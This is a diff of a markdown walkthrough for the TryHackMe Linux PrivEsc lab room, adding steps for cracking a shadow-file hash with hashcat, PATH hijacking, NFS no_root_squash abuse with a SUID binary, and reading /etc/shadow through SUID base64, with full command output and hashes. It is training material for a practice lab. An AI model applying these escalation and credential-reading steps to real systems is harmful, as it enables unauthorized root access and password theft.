@@ -1,4 +1,6 @@
 # TryHackMe [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
+### References
+* Beyhan, A. (2021, October 20). TryHackMe Linux PrivEsc Capstone Challenge. Medium; Medium. https://medium.com/@abdullahbeyhan/try-hack-me-linux-privesc-capstone-challenge-jr-penetrati%CC%87on-tester-4d40772728b0
 ## Enumeration
 ### What is the hostname of the target system?
 ```bash
@@ -323,7 +325,7 @@ THM-9349843
 $ ssh karen@<MACHINE_IP>
 karen@<MACHINE_IP> password: Password1
 $ python3 -c 'from pty import spawn; spawn("/bin/bash")'
-karen@ip-10-10-30-209:~$ cat /etc/crontab 
+karen@ip-10-10-30-209:~$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -370,7 +372,7 @@ THM-383000283
 
 **Flag 5**: `THM-383000283`
 ### What is Matt's password?
-
+1. With the obtained `root` privilages, obtain `matt`'s password hash:
 ```bash
 root@ip-10-10-118-61:~# cat /etc/shadow
 root:*:18561:0:99999:7:::
@@ -410,7 +412,7 @@ karen:$6$ZC4srkt5HufYpAAb$GVDM6arO/qQU.o0kLOZfMLAFGNHXULH5bLlidB455aZkKrMvdB1upy
 lxd:!:18798::::::
 matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
 ```
-
+2. Crack the hash with `hashcat`:
 ```bash
 $ hashcat -O -D 2 -m 1800 '$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' rockyou.txt
 $6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:123456
@@ -430,3 +432,190 @@ Restore.Point....: 0/14344384 (0.00%)
 Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
 Candidates.#2....: 123456 -> mexico1
 ```
+
+**Answer**: `123456`
+## `PATH`
+### What is the odd folder you have write access for?
+```bash
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
+karen@ip-10-10-118-61:/$ find /home -writable 2>/dev/null
+/home/murdoch
+```
+
+**ANswer**: `/home/murdoch`
+### What is the content of the `flag6.txt` file?
+1. Add `/home/murdoch` to the `PATH` environmane variable:
+```bash
+karen@ip-10-10-118-61:/$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+karen@ip-10-10-118-61:/$ export PATH=/home/murdoch:$PATH
+karen@ip-10-10-118-61:/$ echo $PATH
+/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+karen@ip-10-10-208-48:/$ cd /home/murdoch/
+karen@ip-10-10-208-48:/home/murdoch$ find / -name flag6.txt 2>/dev/null
+/home/matt/flag6.txt
+```
+2. Use the provided `/home/murdoch/test` binary with a `cat` command:
+```bash
+karen@ip-10-10-208-48:/home/murdoch$ echo "cat /home/matt/flag6.txt" > thm
+karen@ip-10-10-208-48:/home/murdoch$ chmod +x thm
+karen@ip-10-10-208-48:/home/murdoch$ ./test thm
+THM-736628929
+```
+
+**Flag 6**: `THM-736628929`
+## NFS
+### How many mountable shares can you identify on the target system?
+```bash
+$ ssh karen@<MACHINE_IP>
+karen@<MACHINE_IP> password: Password1
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
+karen@ip-10-10-19-156:/$ showmount -e 10.10.19.156
+Export list for 10.10.19.156:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+karen@ip-10-10-19-156:/$ 
+```
+
+**Answer**: `3`
+### How many shares have the `no_root_squash` option enabled?
+```bash
+karen@ip-10-10-19-156:/$ cat /etc/exports 
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+**Answer**: `3`
+### What is the content of the `flag7.txt` file?
+1. On attacking machine:
+```bash
+$ mkdir /tmp/backup
+$ sudo mount -o rw 10.10.19.156:/tmp /tmp/backup
+$ sudo gcc -w -o /tmp/backup/nfs path_exploit.c
+$ sudo chmod +s /tmp/backup/nfs
+$ ls -la /tmp/backup/nfs
+-rwsr-sr-x 1 root root 16152 Oct 27 04:28 /tmp/backup/nfs
+```
+2. On target maching:
+```bash
+karen@ip-10-10-19-156:/tmp$ cd /tmp
+karen@ip-10-10-19-156:/tmp$ ./nfs
+root@ip-10-10-19-156:/tmp# find / -name flag7.txt 2>/dev/null
+/home/matt/flag7.txt
+root@ip-10-10-19-156:/tmp# cat /home/matt/flag7.txt
+THM-89384012
+```
+
+**Flag 7**: `THM-89384012`
+## Capstone Challenge
+### What is the content of the `flag1.txt` file?
+```bash
+$ ssh leonard@10.10.147.252
+Password: Penny123
+$ bash
+[leonard@ip-10-10-147-252 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
+16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
+17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
+17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
+17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
+17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
+17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
+17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
+17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
+17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
+17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
+17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
+17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
+17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
+17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
+17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
+17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
+18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
+20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
+34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
+34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
+36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
+35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
+38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
+958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
+51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
+37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
+37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
+37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
+37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
+18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
+18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
+[leonard@ip-10-10-147-252 ~]$ base64 /etc/shadow | base64 --decode
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+bin:*:18353:0:99999:7:::
+daemon:*:18353:0:99999:7:::
+adm:*:18353:0:99999:7:::
+lp:*:18353:0:99999:7:::
+sync:*:18353:0:99999:7:::
+shutdown:*:18353:0:99999:7:::
+halt:*:18353:0:99999:7:::
+mail:*:18353:0:99999:7:::
+operator:*:18353:0:99999:7:::
+games:*:18353:0:99999:7:::
+ftp:*:18353:0:99999:7:::
+nobody:*:18353:0:99999:7:::
+pegasus:!!:18785::::::
+systemd-network:!!:18785::::::
+dbus:!!:18785::::::
+polkitd:!!:18785::::::
+colord:!!:18785::::::
+unbound:!!:18785::::::
+libstoragemgmt:!!:18785::::::
+saslauth:!!:18785::::::
+rpc:!!:18785:0:99999:7:::
+gluster:!!:18785::::::
+abrt:!!:18785::::::
+postfix:!!:18785::::::
+setroubleshoot:!!:18785::::::
+rtkit:!!:18785::::::
+pulse:!!:18785::::::
+radvd:!!:18785::::::
+chrony:!!:18785::::::
+saned:!!:18785::::::
+apache:!!:18785::::::
+qemu:!!:18785::::::
+ntp:!!:18785::::::
+tss:!!:18785::::::
+sssd:!!:18785::::::
+usbmuxd:!!:18785::::::
+geoclue:!!:18785::::::
+gdm:!!:18785::::::
+rpcuser:!!:18785::::::
+nfsnobody:!!:18785::::::
+gnome-initial-setup:!!:18785::::::
+pcp:!!:18785::::::
+sshd:!!:18785::::::
+avahi:!!:18785::::::
+oprofile:!!:18785::::::
+tcpdump:!!:18785::::::
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+mailnull:!!:18785::::::
+smmsp:!!:18785::::::
+nscd:!!:18785::::::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+```
+
+### What is the content of the `flag2.txt` file?
+
